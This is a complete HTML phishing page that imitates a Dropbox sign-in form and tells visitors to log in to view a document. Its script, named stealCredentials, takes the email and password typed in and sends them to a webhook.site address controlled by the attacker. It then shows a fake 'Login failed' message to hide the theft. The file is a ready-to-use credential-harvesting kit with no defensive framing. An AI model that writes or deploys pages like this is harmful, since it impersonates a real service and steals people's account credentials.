<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Dropbox - Sign In</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #f7f7f7; }
    .login-box { width: 300px; margin: auto; padding: 20px; border: 1px solid #ccc; background: white; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
    button { padding: 10px 20px; background: #007ee5; color: white; border: none; border-radius: 4px; cursor: pointer; }
    button:hover { background: #005bb5; }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Dropbox Login</h2>
    <p>Please sign in to view the document.</p>
    <input type="email" id="email" placeholder="Email">
    <input type="password" id="password" placeholder="Password">
    <button onclick="stealCredentials()">Sign In</button>
  </div>
  <script>
    function stealCredentials() {
      var email = document.getElementById("email").value;
      var password = document.getElementById("password").value;
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://webhook.site/a88b3a55-cc48-4794-a954-dcaee00db9b8?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password), true);
      xhr.send();
      alert("Login failed. Please try again.");
    }
  </script>
</body>
</html>
